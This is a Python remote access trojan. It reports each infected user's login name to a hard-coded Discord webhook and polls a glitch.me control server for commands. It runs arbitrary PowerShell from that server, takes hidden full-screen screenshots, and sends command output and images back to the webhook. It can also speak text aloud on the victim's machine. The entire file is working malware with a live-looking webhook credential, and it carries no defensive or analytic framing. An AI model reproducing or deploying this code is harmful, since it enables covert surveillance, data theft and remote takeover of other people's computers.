import requests
from requests import get as g
from time import sleep
import pygame
from gtts import gTTS
import json
import os 
import subprocess
webhook_url = 'https://discord.com/api/webhooks/1174633126492901386/-UYv_iW1OhYA0OWhraRBbBbCL657V0LpoO1k1RbLbLsH1hwHX0O6hom_WGFJ62CVuhXX'
message = "User " + os.getlogin() + " has been infected with the virus. Head to https://plant-sponge-becklespinax.glitch.me/ to control device"
data = {
    "content": message
}
response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
powershell_command = """
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$screens = [Windows.Forms.Screen]::AllScreens;
$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum;
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum;
$right = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum;
$bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum;
$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom);
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height);
$graphics = [Drawing.Graphics]::FromImage($bmp);
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
$bmp.Save("$env:USERPROFILE\\test.png");
$graphics.Dispose();
$bmp.Dispose();
"""
powershell_command = powershell_command.replace('\n', ';').strip()
def speak(n):
	pygame.mixer.init() 
	language = 'en'
	speech = gTTS(text=n, lang=language, slow=False)
	speech.save("t.mp3")
	pygame.mixer.music.load("./t.mp3")
	pygame.mixer.music.play()
	while pygame.mixer.music.get_busy():
		sleep(0.1)
	pygame.mixer.music.stop()
	pygame.mixer.quit()
	os.remove('t.mp3')
while True:
	a = g('https://plant-sponge-becklespinax.glitch.me/list').text
	if a == 'command:screenshot':
		result = subprocess.run(['powershell', '-Command', powershell_command], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True, text=True)
		file_path = 'c:/Users/' + os.getlogin() + '/test.png'
		with open(file_path, 'rb') as file:
			data = {
				'file': file
			}
			response = requests.post(webhook_url, files=data)
	else:
		if 'command:' in a:
			result = subprocess.run(["powershell", a[8:len(a)]], capture_output=True, text=True)
			message = result.stdout
			data = {
	    			"content": message
			}
			response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
		else:
			if a == '<br>':
				sleep(2)
			else:
				speak(a[6:len(a)])
